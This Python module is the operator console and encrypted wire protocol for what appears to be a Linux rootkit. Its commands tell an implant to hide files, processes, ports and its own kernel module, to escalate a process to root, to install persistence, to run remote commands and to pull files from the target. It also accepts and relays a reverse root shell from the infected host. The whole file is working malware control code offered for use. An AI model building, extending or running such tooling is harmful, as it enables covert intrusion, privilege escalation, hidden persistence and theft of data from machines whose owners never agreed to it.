"""Authenticated control console and wire protocol."""

from __future__ import annotations

import contextlib
import fcntl
import logging
import os
from pathlib import Path
import re
import secrets
import selectors
import socket
import struct
import subprocess
import sys
import termios
import time
import tomllib
import tty
from typing import Callable, TextIO

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console as RichConsole
from rich.table import Table

KEY_LENGTH = 32
NONCE_LENGTH = 12
TAG_LENGTH = 16
HEADER_LENGTH = 18
FRAME_MAX = 4096
VERSION = 1
REQUEST = 1
REPLY = 2
SEQUENCE_MAX = 0x7FFFFFFF
SHELL_PRELUDE_LENGTH = 31
SHELL_TICKET = re.compile(r"OPEN ([0-9a-f]{8}) ([0-9a-f]{16})")
SHELL_STATUS = re.compile(
    r"STATE ([0-9a-f]{8}) "
    r"(idle|connecting|running|exited|refused|timed-out|failed|stopped) "
    r"(-?[0-9]+)"
)
CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
_CATEGORIES = ("file", "pid", "content", "port")
_PROTOCOL_PATH = Path(__file__).parent / "protocol.toml"

_nullctx = contextlib.nullcontext
log = logging.getLogger("operator")

DEFAULT_CONTROL_PORT = 42069
DEFAULT_SHELL_PORT = 42070
DEFAULT_BIND_ADDR = "127.0.0.1"


# ---------------------------------------------------------------------------
# Protocol metadata
# ---------------------------------------------------------------------------

def _load_protocol(path: Path = _PROTOCOL_PATH) -> dict:
    with open(path, "rb") as f:
        return tomllib.load(f)


def _build_help(proto: dict) -> str:
    groups: dict[str, list[str]] = {}
    for cmd in proto["commands"].values():
        g = cmd["group"]
        groups.setdefault(g, [])
        wire = cmd["wire"]
        def _fmt_token(t):
            if t.startswith("<") and t.endswith(">"):
                return t[1:-1].upper()
            if t.startswith("[") and t.endswith("]"):
                return f"[{t[1:-1].upper()}]"
            return t.lower()
        name = " ".join(_fmt_token(t) for t in wire.split())
        groups[g].append(f"  {name:<22}{cmd['help']}")
    groups.setdefault("operate", [])
    groups["operate"].append(f"  {'exec COMMAND':<22}run command on target")
    groups.setdefault("session", [])
    groups["session"].append(f"  {'help':<22}show this reference")
    order = ["session", "view", "operate", "hide", "unhide", "list"]
    lines = []
    for g in order:
        if g not in groups:
            continue
        lines.append(g.title())
        lines.extend(groups[g])
        lines.append("")
    return "\n".join(lines).rstrip()


def _build_completions(proto: dict) -> dict:
    comps: dict = {}
    for cmd in proto["commands"].values():
        parts = re.split(r"[<\[]", cmd["wire"])[0].strip().lower().split()
        if len(parts) == 1:
            comps.setdefault(parts[0], None)
        elif len(parts) == 2:
            if not isinstance(comps.get(parts[0]), dict):
                comps[parts[0]] = {}
            comps[parts[0]][parts[1]] = None
    comps["help"] = None
    comps["quit"] = None
    comps["exec"] = None
    return comps


_PROTOCOL = _load_protocol()
PROTOCOL_VERSION = _PROTOCOL["protocol"]["version"]
COMMAND_HELP = _build_help(_PROTOCOL)
_OPERATOR_COMPLETIONS = _build_completions(_PROTOCOL)
_ERROR_TABLE = {int(k): v for k, v in _PROTOCOL["errors"].items()}


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

class _StdoutHandler(logging.Handler):
    def emit(self, record):
        try:
            msg = self.format(record)
            sys.stdout.write(msg + "\n")
            sys.stdout.flush()
        except Exception:
            self.handleError(record)


def setup_logging():
    if log.handlers:
        return
    handler = _StdoutHandler()
    handler.setFormatter(logging.Formatter("%(message)s"))
    log.addHandler(handler)
    log.setLevel(logging.INFO)


# ---------------------------------------------------------------------------
# Errors and helpers
# ---------------------------------------------------------------------------

class OperatorError(RuntimeError):
    pass


def protocol_error(reply: str) -> str | None:
    if not reply.startswith("ERR "):
        return None
    try:
        code = int(reply.split()[1])
    except (IndexError, ValueError):
        return reply
    return _ERROR_TABLE.get(code, f"unknown error {code}")


def new_key() -> bytes:
    key = bytes(KEY_LENGTH)
    while not any(key):
        key = secrets.token_bytes(KEY_LENGTH)
    return key


def listener(addr: str = DEFAULT_BIND_ADDR, port: int = 0) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((addr, port))
        sock.listen(4)
    except OSError:
        sock.close()
        raise
    return sock


# ---------------------------------------------------------------------------
# Wire protocol: framing, crypto, secure control
# ---------------------------------------------------------------------------

def _nonce(session: int, sequence: int, kind: int) -> bytes:
    if not 0 < session < 1 << 64:
        raise OperatorError("session must be a nonzero 64-bit integer")
    if not 0 < sequence <= SEQUENCE_MAX or kind not in (REQUEST, REPLY):
        raise OperatorError("invalid secure-envelope sequence or direction")
    counter = (sequence << 1) | (kind == REPLY)
    return struct.pack(">QI", session, counter)


class OpenSslAead:
    def __init__(self, key: bytes, helper: Path, output: Callable[[str], None]):
        if len(key) != KEY_LENGTH:
            raise OperatorError("control key must contain exactly 32 bytes")
        self._key = key
        self._helper = helper
        self._output = output

    def close(self) -> None:
        self._key = bytes(KEY_LENGTH)

    def _run(self, operation: str, nonce: bytes, aad: bytes, payload: bytes) -> bytes:
        if len(nonce) != NONCE_LENGTH:
            raise OperatorError("AES-GCM nonce must contain exactly 12 bytes")
        if len(aad) > 0xFFFF or len(payload) > 0xFFFF:
            raise OperatorError("AES-GCM input exceeds the helper limit")
        request = b"".join((
            self._key, nonce,
            struct.pack(">HH", len(aad), len(payload)),
            aad, payload,
        ))
        result = subprocess.run(
            [self._helper, operation],
            input=request, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, check=False,
        )
        if result.stderr:
            self._output(result.stderr.decode(errors="replace"))
        if result.returncode:
            detail = result.stderr.decode(errors="replace").strip()
            raise OperatorError(detail or "OpenSSL AES-GCM operation failed")
        return result.stdout

    def seal(self, nonce: bytes, aad: bytes, plaintext: bytes) -> bytes:
        sealed = self._run("seal", nonce, aad, plaintext)
        if len(sealed) != len(plaintext) + TAG_LENGTH:
            raise OperatorError("OpenSSL AES-GCM returned a truncated result")
        return sealed

    def open(self, nonce: bytes, aad: bytes, sealed: bytes) -> bytes:
        if len(sealed) < TAG_LENGTH:
            raise OperatorError("authenticated payload is shorter than its tag")
        plaintext = self._run("open", nonce, aad, sealed)
        if len(plaintext) != len(sealed) - TAG_LENGTH:
            raise OperatorError("OpenSSL AES-GCM returned a truncated result")
        return plaintext


class SecureControl:
    def __init__(self, key: bytes, aead_factory):
        self._aead = aead_factory(key)
        self.session = 0
        self.next_request = 1
        self.next_reply = 1

    def close(self) -> None:
        self._aead.close()

    @staticmethod
    def _header(kind: int, session: int, sequence: int) -> bytes:
        return struct.pack(">BBQQ", VERSION, kind, session, sequence)

    @staticmethod
    def _parts(envelope: bytes) -> tuple[bytes, int, int, int, int, bytes]:
        if not HEADER_LENGTH + TAG_LENGTH <= len(envelope) <= FRAME_MAX:
            raise OperatorError("secure envelope has an invalid length")
        header = envelope[:HEADER_LENGTH]
        version, kind, session, sequence = struct.unpack(">BBQQ", header)
        return header, version, kind, session, sequence, envelope[HEADER_LENGTH:]

    def accept_hello(self, envelope: bytes) -> int:
        header, version, kind, session, sequence, sealed = self._parts(envelope)
        if version != VERSION or kind != REPLY or sequence != 1 or not session:
            raise OperatorError("invalid HELLO envelope header")
        plaintext = self._aead.open(
            _nonce(session, sequence, kind), header, sealed,
        )
        if not plaintext.startswith(b"HELLO "):
            raise OperatorError("authenticated first message is not HELLO")
        parts = plaintext.split()
        if len(parts) < 2:
            raise OperatorError("HELLO missing protocol version")
        remote_version = int(parts[1])
        if remote_version != PROTOCOL_VERSION:
            raise OperatorError(
                f"protocol version mismatch: "
                f"agent={remote_version} operator={PROTOCOL_VERSION}"
            )
        self.session = session
        self.next_reply = 2
        return session

    def seal_request(self, plaintext: bytes) -> bytes:
        if not self.session:
            raise OperatorError("HELLO has not been authenticated")
        if len(plaintext) > FRAME_MAX - HEADER_LENGTH - TAG_LENGTH:
            raise OperatorError("control command is too long")
        if self.next_request > SEQUENCE_MAX:
            raise OperatorError("control request sequence is exhausted")
        sequence = self.next_request
        header = self._header(REQUEST, self.session, sequence)
        sealed = self._aead.seal(
            _nonce(self.session, sequence, REQUEST), header, plaintext,
        )
        self.next_request += 1
        return header + sealed

    def open_reply(self, envelope: bytes) -> bytes:
        if not self.session:
            raise OperatorError("HELLO has not been authenticated")
        if self.next_reply > SEQUENCE_MAX:
            raise OperatorError("control reply sequence is exhausted")
        header, version, kind, session, sequence, sealed = self._parts(envelope)
        if (
            version != VERSION or kind != REPLY
            or session != self.session
            or sequence != self.next_reply
        ):
            raise OperatorError("unexpected authenticated reply header")
        plaintext = self._aead.open(
            _nonce(session, sequence, kind), header, sealed,
        )
        self.next_reply += 1
        return plaintext


def _receive_exact(peer: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        chunk = peer.recv(length - len(chunks))
        if not chunk:
            raise OperatorError("control connection closed mid-frame")
        chunks.extend(chunk)
    return bytes(chunks)


def receive_frame(peer: socket.socket) -> bytes:
    length = struct.unpack(">H", _receive_exact(peer, 2))[0]
    if not 1 <= length <= FRAME_MAX:
        raise OperatorError("control frame has an invalid length")
    return _receive_exact(peer, length)


def send_frame(peer: socket.socket, payload: bytes) -> None:
    if not 1 <= len(payload) <= FRAME_MAX:
        raise OperatorError("control frame has an invalid length")
    peer.sendall(struct.pack(">H", len(payload)) + payload)


def encode_control_command(command: str) -> bytes:
    try:
        payload = command.encode("ascii")
    except UnicodeEncodeError as error:
        raise OperatorError("commands use ASCII characters only") from error
    if len(payload) > CONTROL_TEXT_MAX:
        raise OperatorError(
            f"command is too long (maximum {CONTROL_TEXT_MAX} ASCII bytes)"
        )
    return payload


def parse_shell_ticket(reply: str) -> tuple[int, int]:
    match = SHELL_TICKET.fullmatch(reply)
    if match is None:
        raise OperatorError("shell request returned an invalid ticket")
    request_id = int(match.group(1), 16)
    cookie = int(match.group(2), 16)
    if not request_id or not cookie:
        raise OperatorError("shell request returned an invalid ticket")
    return request_id, cookie


def poll_shell_status(
    request_id: int,
    exchange: Callable[[str], str],
    pause: Callable[[float], None] = time.sleep,
) -> str:
    for _ in range(100):
        reply = exchange("SHELL STATUS")
        match = SHELL_STATUS.fullmatch(reply)
        if match is None or int(match.group(1), 16) != request_id:
            raise OperatorError("shell returned an invalid status")
        if match.group(2) not in ("connecting", "running"):
            return reply
        pause(0.05)
    raise OperatorError("shell did not reach a terminal state")


# ---------------------------------------------------------------------------
# Shell accept + relay
# ---------------------------------------------------------------------------

def accept_shell(
    shell_listener: socket.socket,
    request_id: int,
    cookie: int,
    timeout: float,
) -> socket.socket:
    expected = f"RKSH {request_id:08x} {cookie:016x}\n".encode("ascii")
    deadline = time.monotonic() + timeout
    sel = selectors.DefaultSelector()
    sel.register(shell_listener, selectors.EVENT_READ)
    try:
        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            if not sel.select(timeout=min(remaining, 1.0)):
                continue
            shell, _ = shell_listener.accept()
            try:
                shell.settimeout(min(2.0, remaining))
                prelude = _receive_exact(shell, SHELL_PRELUDE_LENGTH)
            except (OSError, OperatorError):
                shell.close()
                continue
            if secrets.compare_digest(prelude, expected):
                shell.settimeout(None)
                return shell
            shell.close()
    finally:
        sel.unregister(shell_listener)
        sel.close()
    raise OperatorError("timed out waiting for the requested root shell")


def relay_shell(
    shell: socket.socket,
    input_stream: TextIO,
    output: Callable[[str], None],
) -> None:
    selector = selectors.DefaultSelector()
    selector.register(shell, selectors.EVENT_READ, "shell")
    input_fd = None
    close_pending = False
    input_line = bytearray()
    saved_terminal = None
    try:
        input_fd = input_stream.fileno()
        if os.isatty(input_fd):
            saved_terminal = termios.tcgetattr(input_fd)
            tty.setraw(input_fd)
        selector.register(input_fd, selectors.EVENT_READ, "input")
    except (AttributeError, ValueError, OSError, termios.error):
        input_fd = None
        try:
            selector.register(input_stream, selectors.EVENT_READ, "input")
        except (ValueError, OSError):
            shell.shutdown(socket.SHUT_WR)
    try:
        while selector.get_map():
            for key, _ in selector.select():
                if key.data == "shell":
                    data = shell.recv(4096)
                    if not data:
                        selector.unregister(shell)
                        return
                    output(data.decode(errors="replace"))
                    if close_pending:
                        shell.shutdown(socket.SHUT_WR)
                        close_pending = False
                elif input_fd is not None:
                    data = os.read(input_fd, 4096)
                    if not data:
                        selector.unregister(input_fd)
                        shell.shutdown(socket.SHUT_WR)
                    else:
                        forwarded, close_input = _shell_input(data, input_line)
                        if forwarded:
                            shell.sendall(forwarded)
                        if close_input:
                            selector.unregister(input_fd)
                            if forwarded:
                                close_pending = True
                            else:
                                shell.shutdown(socket.SHUT_WR)
                else:
                    line = input_stream.readline()
                    if not line:
                        selector.unregister(input_stream)
                        shell.shutdown(socket.SHUT_WR)
                    else:
                        data = line.encode()
                        forwarded, close_input = _shell_input(data, input_line)
                        if forwarded:
                            shell.sendall(forwarded)
                        if close_input:
                            selector.unregister(input_stream)
                            if forwarded:
                                close_pending = True
                            else:
                                shell.shutdown(socket.SHUT_WR)
    finally:
        if saved_terminal is not None and input_fd is not None:
            termios.tcsetattr(input_fd, termios.TCSADRAIN, saved_terminal)
        selector.close()


def _shell_input(data: bytes, line: bytearray) -> tuple[bytes, bool]:
    forwarded = bytearray()
    close_input = False
    for byte in data:
        if byte == 4:
            forwarded.append(byte)
            close_input = not line
            line.clear()
            continue
        forwarded.append(byte)
        if byte in (10, 13):
            command = bytes(line).strip()
            if command in (b"exit", b"logout") or command.startswith(b"exit "):
                close_input = True
            line.clear()
        elif len(line) < 256:
            line.append(byte)
        else:
            line.clear()
    return bytes(forwarded), close_input


# ---------------------------------------------------------------------------
# Crypto helper build
# ---------------------------------------------------------------------------

def build_crypto_helper(
    root: Path,
    directory: Path,
    transcript: Callable[[list[object]], None],
    output: Callable[[str], None],
) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    helper = directory / "control-aead"
    source = Path(__file__).parent / "control_aead.c"
    lock_path = directory / "control-aead.lock"
    with lock_path.open("a+b") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        if (
            helper.is_file()
            and not helper.is_symlink()
            and helper.stat().st_mtime_ns >= source.stat().st_mtime_ns
        ):
            return helper
        candidate = directory / ".control-aead.new"
        command = [
            "gcc", "-std=c11", "-Wall", "-Wextra", "-Werror", "-O2",
            "-o", str(candidate), str(source), "-lcrypto",
        ]
        transcript(command)
        result = subprocess.run(
            command, cwd=root,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, check=False,
        )
        if result.stdout:
            output(result.stdout)
        if result.returncode:
            candidate.unlink(missing_ok=True)
            raise OperatorError(
                "could not build control crypto; run make doctor"
            )
        os.replace(candidate, helper)
    return helper


# ---------------------------------------------------------------------------
# Operator console (command dispatch, no I/O coupling)
# ---------------------------------------------------------------------------

class OperatorConsole:
    def __init__(
        self,
        exchange: Callable[[str], str],
        exchange_quiet: Callable[[str], str],
        on_shell: Callable[[str], None],
        shell_port: int = 0,
        receive_reply: Callable[[], bytes] | None = None,
        target=None,
        input_stream: TextIO | None = None,
    ):
        self._exchange = exchange
        self._exchange_quiet = exchange_quiet
        self._on_shell = on_shell
        self._shell_port = shell_port
        self._receive_reply = receive_reply
        self._target = target
        self._input_stream = input_stream
        self._rc = None
        completions = dict(_OPERATOR_COMPLETIONS)
        if target is not None:
            completions["back"] = None
        if input_stream is None:
            self._session = PromptSession(
                completer=NestedCompleter.from_nested_dict(completions),
            )
        else:
            self._session = None
        self.prompt = "operator> "
        self._quit = False

    def _send(self, wire: str) -> str:
        try:
            payload = wire.encode("ascii")
        except UnicodeEncodeError:
            log.warning("commands use ASCII characters only")
            return ""
        if len(payload) > CONTROL_TEXT_MAX:
            log.warning("command is too long (maximum %d bytes)", CONTROL_TEXT_MAX)
            return ""
        return self._exchange(wire)

    def _list_category(self, category: str) -> None:
        count_reply = self._exchange_quiet(f"LIST {category}")
        if not count_reply.startswith("LIST "):
            return
        count = int(count_reply.split()[1])
        if count == 0:
            log.info("  (empty)")
            return
        for i in range(count):
            entry_reply = self._exchange_quiet(f"LIST {category} {i}")
            if entry_reply.startswith("ENTRY "):
                parts = entry_reply.split(None, 2)
                value = parts[2] if len(parts) > 2 else ""
                log.info("  [%d] %s", i, value)

    def do_hide(self, arg: str) -> None:
        parts = arg.strip().split(None, 1)
        if not parts:
            log.warning("usage: hide file|pid|content|port|module VALUE")
            return
        sub = parts[0].lower()
        if sub == "module":
            self._send("HIDE MODULE")
            return
        if sub in _CATEGORIES and len(parts) == 2:
            self._send(f"HIDE {sub.upper()} {parts[1]}")
            return
        log.warning("usage: hide file|pid|content|port VALUE")

    def do_unhide(self, arg: str) -> None:
        parts = arg.strip().split()
        if not parts:
            log.warning("usage: unhide file|pid|content|port N | unhide all | unhide module")
            return
        sub = parts[0].lower()
        if sub == "all":
            self._send("UNHIDE ALL")
            return
        if sub == "module":
            self._send("UNHIDE MODULE")
            return
        if sub in _CATEGORIES and len(parts) == 2 and parts[1].isdigit():
            self._send(f"UNHIDE {sub.upper()} {parts[1]}")
            return
        log.warning("usage: unhide file|pid|content|port N")

    def do_list(self, arg: str) -> None:
        cat = arg.strip().lower()
        if not cat:
            for c in _CATEGORIES:
                log.info("%s:", c)
                self._list_category(c.upper())
            return
        if cat in _CATEGORIES:
            log.info("%s:", cat)
            self._list_category(cat.upper())
            return
        log.warning("usage: list [file|pid|content|port]")

    def do_status(self, arg: str) -> None:
        reply = self._exchange_quiet("STATUS")
        if not reply.startswith("STATUS "):
            return
        table = Table(show_header=False, box=None, padding=(0, 2))
        table.add_column(style="bold")
        table.add_column()
        for pair in reply[7:].split():
            if "=" in pair:
                k, v = pair.split("=", 1)
                table.add_row(k, v)
        self._rc.print(table)

    def do_escalate(self, arg: str) -> None:
        pid = arg.strip()
        if not pid or not pid.isdigit():
            log.warning("usage: escalate PID")
            return
        self._send(f"ESCALATE {pid}")

    def do_persist(self, arg: str) -> None:
        self._send("PERSIST")

    def do_unpersist(self, arg: str) -> None:
        self._send("UNPERSIST")

    def do_exec(self, arg: str) -> None:
        cmd = arg.strip()
        if not cmd:
            log.warning("usage: exec COMMAND")
            return
        if not self._target:
            log.warning("exec requires server mode")
            return
        try:
            log.info("%s", self._target.exec_shell(cmd))
        except Exception as e:
            log.warning("exec: %s", e)

    def do_download(self, arg: str) -> None:
        remote_path = arg.strip()
        if not remote_path:
            log.warning("usage: download PATH")
            return
        if self._target:
            log.info("download  %s", remote_path)
            try:
                def on_progress(received, total):
                    pct = received * 100 // total if total else 100
                    log.info("  %d/%d (%d%%)", received, total, pct)
                data, total = self._target.download_file(remote_path, on_progress)
            except Exception as e:
                log.warning("  %s", e)
                return
            _save_download(remote_path, data)
        elif self._receive_reply:
            log.info("download  %s", remote_path)
            reply = self._exchange_quiet(f"DOWNLOAD {remote_path}")
            err = protocol_error(reply)
            if err:
                log.warning("  %s", err)
                return
            if not reply.startswith("FILE "):
                log.warning("  unexpected: %s", reply)
                return
            total = int(reply.split()[1])
            log.info("  size: %d bytes", total)
            chunks = []
            received = 0
            while True:
                raw = self._receive_reply()
                if raw == b"EOF":
                    break
                chunks.append(raw)
                received += len(raw)
            pct = received * 100 // total if total else 100
            log.info("  %d/%d (%d%%)", received, total, pct)
            _save_download(remote_path, b"".join(chunks))
        else:
            log.warning("download not available in this console")

    def do_shell(self, arg: str) -> None:
        sub = arg.strip().lower()
        if sub == "status":
            self._send("SHELL STATUS")
            return
        reply = self._send(f"SHELL {self._shell_port}")
        if reply and reply.startswith("OPEN "):
            self._on_shell(reply)

    def do_info(self, arg: str) -> None:
        reply = self._exchange_quiet("INFO")
        if not reply.startswith("INFO "):
            return
        parts = reply[5:].split(None, 2)
        if len(parts) >= 3:
            table = Table(show_header=False, box=None, padding=(0, 2))
            table.add_column(style="bold")
            table.add_column()
            table.add_row("hostname", parts[0])
            table.add_row("kernel", parts[1])
            table.add_row("arch", parts[2])
            self._rc.print(table)
        else:
            log.info("  %s", reply[5:])

    def do_back(self, arg: str) -> bool:
        return True

    def do_quit(self, arg: str) -> bool:
        self._quit = True
        return True

    def do_help(self, arg: str) -> None:
        log.info("%s", COMMAND_HELP.rstrip())
        if self._target is not None:
            log.info("  back                return to server view")

    def _read_line(self) -> str | None:
        if self._input_stream is not None:
            line = self._input_stream.readline()
            return line if line else None
        try:
            return self._session.prompt(self.prompt)
        except EOFError:
            return None
        except KeyboardInterrupt:
            return ""

    def run(self) -> None:
        ctx = patch_stdout(raw=True) if self._session else _nullctx()
        with ctx:
            self._rc = RichConsole(highlight=False)
            while True:
                line = self._read_line()
                if line is None:
                    self._quit = True
                    break
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 1)
                cmd_name = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                handler = getattr(self, f"do_{cmd_name}", None)
                if handler:
                    if handler(arg):
                        break
                else:
                    log.warning("unknown command: %s; type help", line)
                if self._target and not self._target.online:
                    log.warning("%s went offline", self._target.id)
                    break

    cmdloop = run


def _save_download(remote_path, data):
    dest = Path("downloads") / remote_path.lstrip("/")
    dest.parent.mkdir(parents=True, exist_ok=True)
    try:
        dest.write_bytes(data)
        log.info("  saved %d bytes to %s", len(data), dest)
    except OSError as e:
        log.warning("  write failed: %s", e)
